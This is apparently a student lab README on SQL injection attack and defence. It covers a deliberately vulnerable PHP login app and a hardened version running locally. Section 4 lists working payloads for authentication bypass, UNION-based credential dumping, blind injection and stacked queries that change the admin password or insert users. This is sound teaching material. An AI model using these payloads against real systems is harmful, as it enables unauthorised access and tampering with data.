# Assignment 5 - SQL Injection Attack and Defense

Team 5
|-- Souradeep Das, 2025201004
|-- Kushal Mukherjee, 2025201072
|-- Srinjoy Sengupta, 2025202010

## 1. Folder Structure

```
Assignment5/
|-- vulnerable_app/
|   |-- index.php
|   |-- authentication.php
|   |-- connection.php
|   |-- style.css
|-- secure_app/
|   |-- index.php
|   |-- authentication.php
|   |-- connection.php
|-- Screenshots/
    |-- vulnerable/
    |-- secure/
|-- README.md
|-- SECURITY.md
```

## 2.1 Environment Setup

1. Install XAMPP.
2. Start Apache and MySQL in XAMPP control panel.
3. Place `vulnerable_app` and `secure_app` directly in:

```
C:\xampp\htdocs\
```

4. Open phpMyAdmin: `http://localhost/phpmyadmin`
5. Run SQL from `database_setup.sql`.

## 2.2 DB setup

Run this sql query in phpmyadmin:

CREATE DATABASE IF NOT EXISTS lab5;
USE lab5;

DROP TABLE IF EXISTS users;
CREATE TABLE users (
    username VARCHAR(50),
    password VARCHAR(50)
);

INSERT INTO users VALUES ('user1', 'pass1');
INSERT INTO users VALUES ('admin', 'admin123');


## 3. Run Vulnerable Application

Open:

`http://localhost/vulnerable_app/`

Normal login:

- Username: `user1`
- Password: `pass1`

## 4. SQL Injection Attacks Demonstrated

### 4.1 Authentication Bypass

- Username: `admin' -- `
- Password: `anything`

Expected result: login succeeds without knowing admin password.

### 4.2 Union-Based Injection

- Username: `' UNION SELECT username, password FROM users -- `
- Password: `anything`

Expected result: multiple rows are returned and displayed.

### 4.3 Blind SQL Injection

- Username: `admin' AND SUBSTRING(password,1,1)='a' -- `
- Password: `x`

Expected result: condition true gives login success, false gives failure.

### 4.4 Database Modification Attack

Example payload to change admin password:

- Username: `admin' OR '1'='1'; UPDATE users SET password='pwned123' WHERE username='admin'; -- `
- Password: `x`

Alternative payload to insert user:

- Username: `x' OR '1'='1'; INSERT INTO users VALUES('hacker','hack123'); -- `
- Password: `x`

## 5. Run Secure Application

Note: Reset the DB to its original state by running the sql query written in this document in section 2.2 before proceeding so that changes made after attacks in the vulnerable app are nullified.

On first run, secure app creates `users_secure` and copies and hashes passwords from `users` into `users_secure`.

Open:

`http://localhost/secure_app/`

Normal login still works for existing users.

Verify all previous SQL injection payloads fail.
